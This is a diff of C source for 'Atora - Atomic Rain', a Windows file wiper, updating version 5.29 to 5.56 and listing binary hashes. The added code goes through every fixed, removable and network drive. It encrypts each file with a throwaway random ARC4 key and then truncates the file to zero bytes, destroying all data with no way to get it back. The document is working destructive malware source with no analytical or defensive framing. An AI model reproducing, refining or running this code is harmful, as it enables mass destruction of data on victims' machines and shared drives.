@@ -1,185 +1,200 @@
 /*
-  Name:             Atora - Atomic Rain.
-  Version:          5.29
-  Class:            Files shredder for Windows / Wiper.
+  Name:             Atora - Atomic Rain. Windows version.
+  Version:          5.56/01.06.20
+  Compiler:         TCC ver 0.9.27
+  Class:            Files shredder for Windows. Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
+  SHA-2-256:        17806e6725140db854bf80de7856f7f57097e43ef92d8fc7585c716096ba1f41
+  SHA-2-256_UPX:    e31f0a9a18b198ac87ba792d49c299cfc59d5f316c6bb47f1f0abb372d1973bf
 */
+#include <io.h>
 #include <time.h>
 #include <stdio.h>
+#include <stdint.h>
 #include <stdlib.h>
+#include <stddef.h>
 #include <windows.h>
 
-#define _ERROR        -1
-#define _ZERO          0
-#define _BYTE        256
-#define _BUFFER_SIZE 512
+#define BUFFER_SIZE 8192
 
-void      arc4(unsigned char * data, short int length);
+char * PARAM_REWRITE_BYTE = "r+b";
 
-void      writetrash(unsigned char * data, short int  length);
-void      finddir(unsigned char * path, unsigned char * mask);
-void      initialized(const unsigned char * key, short int length);
-void      swap(unsigned char * a, unsigned char * b);
-short int checklogicaldisk(unsigned char number_disk);
-void      fileencrypt(const unsigned char * filename);
-void      generatekey(void);
+char * expansion  = "*";
+char * slash      = "\\";
+char * t_one      = ".";
+char * t_two      = "..";
 
-unsigned char * expansion  = "*";
-unsigned char * slash      = "\\";
-unsigned char * t_one      = ".";
-unsigned char * t_two      = "..";
+size_t i, j;
 
-short int vi, bi;
+typedef struct {
+  uint8_t data       [256];
+  uint8_t secret_key [256];
+  uint8_t input      [BUFFER_SIZE];
+  uint8_t output     [BUFFER_SIZE];
+} MEMORY_CTX;
 
-unsigned char secret_key [_BYTE]        = {_ZERO};
-unsigned char buffer     [_BUFFER_SIZE] = {_ZERO};
-unsigned char data       [_BYTE]        = {_ZERO};
+void swap (uint8_t * a, uint8_t * b) {
+  uint8_t t = *a;
+
+  *a = *b;
+  *b = t;
+}
+
+void arc4_init(MEMORY_CTX * ctx, const size_t length) {
+
+  for (i = 0; i < 256; i++)
+    ctx->secret_key[i] = (uint8_t)i;
+
+  for (i = j = 0; i < 256; i++) {
+    j = (j + ctx->data[i % length] + ctx->secret_key[i]) % 256;
+    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
+  }
+
+  i = j = 0;
+}
+
+void arc4(MEMORY_CTX * ctx, const size_t length) {
+  for (register size_t k = 0; k < length; k++) {
+    i = (i + 1) % 256;
+    j = (j + ctx->secret_key[i]) % 256;
+    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
+    ctx->output[k] = ctx->input[k] ^ ctx->secret_key[(ctx->secret_key[i] + ctx->secret_key[j]) % 256];
+  }
+}
+
+int genrand(const int min, const int max) {
+  return min + rand() % ((max + 1) - min);
+}
+
+void write_trash(MEMORY_CTX * ctx, const size_t length) {
+  for (register size_t i = 0; i < length; i++) {
+    ctx->data[i] = (uint8_t)genrand(0x00, 0xFF);
+  }
+}
+
+void generate_key(MEMORY_CTX * ctx) {
+  write_trash(ctx, 256);
+  arc4_init(ctx, 256);
+}
+
+long int size_of_file(FILE * f) {
+
+  fseek(f, 0, SEEK_END);
+  long int result = ftell(f);
+  fseek(f, 0, SEEK_SET);
+
+  return result;
+}
+
+void file_encrypt(MEMORY_CTX * ctx, const uint8_t * filename) {
+  FILE * file = fopen((char *)filename, PARAM_REWRITE_BYTE);
+
+  if (file == NULL) {
+    return;
+  }
+
+  long int fsize = size_of_file(file);
+
+  if ((fsize == -1L) || (fsize == 0)) {
+    fclose(file);
+    return;
+  }
+
+  long int position = 0;
+  size_t   realread = 0;
+
+  while (position < fsize) {
+    realread = fread((void *)(ctx->input), 1, BUFFER_SIZE, file);
+
+    arc4(ctx, realread);
+    fseek(file, position, SEEK_SET);
+
+    if (fwrite((void *)(ctx->output), 1, realread, file) != realread) {
+      position = fsize;
+      break;
+    }
+
+    fflush(file);
+    position += (long int)realread;
+  }
+
+  memset((void *)(ctx->input),  0x00, BUFFER_SIZE);
+  memset((void *)(ctx->output), 0x00, BUFFER_SIZE);
+
+  (void)chsize(fileno(file), 0L);
+
+  fclose(file);
+}
+
+void search_all_files(MEMORY_CTX * ctx, uint8_t * path, uint8_t * mask) {
+  WIN32_FIND_DATA wfd;
+  HANDLE hfound;
+
+  uint8_t newpath[MAX_PATH];
+  uint8_t fpath[MAX_PATH];
+  uint8_t pathifile[MAX_PATH];
+  uint8_t delpath[MAX_PATH];
+
+  strcpy(fpath, path);
+  strcat(fpath, slash);
+  strcpy(delpath, fpath);
+  strcat(fpath, mask);
+
+  if ((hfound = FindFirstFile(fpath, &wfd)) != INVALID_HANDLE_VALUE) {
+    do {
+      if ((strcmp(wfd.cFileName, t_two) != 0) && (strcmp(wfd.cFileName, t_one) != 0)) {
+        if (wfd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
+          strcpy(newpath, path);
+          strcat(newpath, slash);
+          strcat(newpath, wfd.cFileName);
+          search_all_files(ctx, newpath, mask);
+        }
+        else {
+          strcpy(pathifile, delpath);
+          strcat(pathifile, wfd.cFileName);
+
+          generate_key(ctx);
+          file_encrypt(ctx, pathifile);
+        }
+      }
+    } while(FindNextFile(hfound, &wfd) != 0);
+  }
+
+  FindClose(hfound);
+}
+
+int checklogicaldisk(const uint8_t number_disk) {
+  uint8_t logical_disk[4] = "::\\";
+          logical_disk[0] = number_disk;
+
+  uint32_t result = GetDriveType(logical_disk);
+
+  if ((result == DRIVE_FIXED) || (result == DRIVE_REMOVABLE) || (result == DRIVE_REMOTE))
+    return 0;
+  else
+    return (-1);
+}
 
 int main (void) {
- unsigned char disk;
- time_t real_time;
- unsigned char LOCAL_DISK[] = "+:";
- 
- srand(time(&real_time));
+  uint8_t local_disk[] = "::";
+  size_t  memory_size = sizeof(MEMORY_CTX);
 
- for (disk = 65; disk <= 90; disk++) {
-  if (checklogicaldisk(disk) == _ZERO) {
-   LOCAL_DISK[_ZERO] = disk;
-   finddir(LOCAL_DISK, expansion);
-  }
- }
- 
- memset(secret_key, _ZERO, _BYTE);
- return _ZERO;
-}
+  MEMORY_CTX * memory = (MEMORY_CTX *)calloc(1, memory_size);
 
-void finddir(unsigned char * path, unsigned char * mask) {
- WIN32_FIND_DATA wfd;
- HANDLE hfound;
+  if (memory != NULL) {
+    srand((uint32_t)time(NULL));
 
- unsigned char newpath[MAX_PATH]  = {_ZERO};
- unsigned char fpath[MAX_PATH]    = {_ZERO};
- unsigned char pathfile[MAX_PATH] = {_ZERO};
- unsigned char delpath[MAX_PATH]  = {_ZERO};
-
- strcpy(fpath, path);
- strcat(fpath, slash);
- strcpy(delpath, fpath);
- strcat(fpath, mask);
-
- if ((hfound = FindFirstFile(fpath, &wfd)) != INVALID_HANDLE_VALUE) {
-  do {
-   if ((wfd.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) && (strcmp(wfd.cFileName, t_two) != _ZERO) && (strcmp(wfd.cFileName, t_one) != _ZERO)) {
-    strcpy(pathfile, path);
-    strcat(pathfile, slash);
-    strcat(pathfile, wfd.cFileName);
-    generatekey();
-    fileencrypt(pathfile);
-   }
-  } while (FindNextFile(hfound, &wfd));
- }
-
- FindClose(hfound);
- strcpy(fpath, path);
- strcat(fpath, slash);
- strcat(fpath, expansion);
-
- if ((hfound = FindFirstFile(fpath, &wfd)) != INVALID_HANDLE_VALUE) {
-  do {
-   if ((wfd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(wfd.cFileName, t_two) != _ZERO) && (strcmp(wfd.cFileName, t_one) != _ZERO)) {
-    strcpy(newpath, path);
-    strcat(newpath, slash);
-    strcat(newpath, wfd.cFileName);
-    finddir(newpath, mask);
-   }
-  } while (FindNextFile(hfound, &wfd));
- }
- FindClose(hfound);
-}
-
-void generatekey(void) {
- writetrash(data, _BYTE);
- initialized(data, _BYTE);
- memset(data, _ZERO, _BYTE);
-}
-
-short int checklogicaldisk(unsigned char number_disk) {
- unsigned char LOGICAL_DISK[] = "+:\\";
- LOGICAL_DISK[_ZERO] = number_disk;
-
- short int result = (short int)GetDriveType(LOGICAL_DISK);
- 
- if ((result == DRIVE_FIXED) || (result == DRIVE_REMOTE))
-  return _ZERO;
- else
-  return _ERROR;
-}
-
-void writetrash(unsigned char * data, short int length) {
- short int i;
-
-  for (i = _ZERO; i < length; i++)
-   data[i] = (unsigned char)(rand() % _BYTE);
-}
-
-void fileencrypt(const unsigned char * filename) {
- FILE * f = fopen(filename, "r+b");
-
-  if (f != NULL) {
-   fseek(f, _ZERO, SEEK_END);
-   long int fsize = ftell(f);
-   fseek(f, _ZERO, SEEK_SET);
-
-    if ((fsize != -1L) && (fsize > _ZERO)) {
-
-     long int  position = _ZERO;
-     short int realread = _ZERO;
-
-      while (position < fsize) {
-       realread = fread(buffer, 1, _BUFFER_SIZE, f);
-
-       arc4(buffer, realread);
-
-       fseek(f, position, SEEK_SET);
-       fwrite(buffer, 1, realread, f);
-       fflush(f);
-
-       memset(buffer, _ZERO, _BUFFER_SIZE);
-       position += realread;
+    for (uint8_t disk = 'A'; disk <= 'Z'; disk++) {
+      if (checklogicaldisk(disk) == 0) {
+        local_disk[0] = disk;
+        search_all_files(memory, local_disk, expansion);
       }
     }
-   fclose(f);
+
+    memset((void *)memory, 0x00, memory_size);
+    free((void *)memory);
+    memory = NULL;
   }
-}
 
-void swap (unsigned char * a, unsigned char * b) {
- unsigned char t = *a;
-
- *a = *b;
- *b = t;
-}
-
-void initialized(const unsigned char * key, short int length) {
-
- for (vi = _ZERO; vi < _BYTE; vi++)
-  secret_key[vi] = (unsigned char)vi;
-
- for (vi = bi = _ZERO; vi < _BYTE; vi++) {
-  bi = (bi + key[vi % length] + secret_key[vi]) % _BYTE;
-  swap(&secret_key[vi], &secret_key[bi]);
- }
-
- vi = bi = _ZERO;
-}
-
-void arc4(unsigned char * data, short int length) {
- register short int z;
-  for (z = _ZERO; z < length; z++) {
-   vi = (vi + 1) % _BYTE;
-   bi = (bi + secret_key[vi]) % _BYTE;
-
-   swap(&secret_key[vi], &secret_key[bi]);
-
-   data[z] ^= secret_key[(secret_key[vi] + secret_key[bi]) % _BYTE];
-  }
+  return 0;
 }
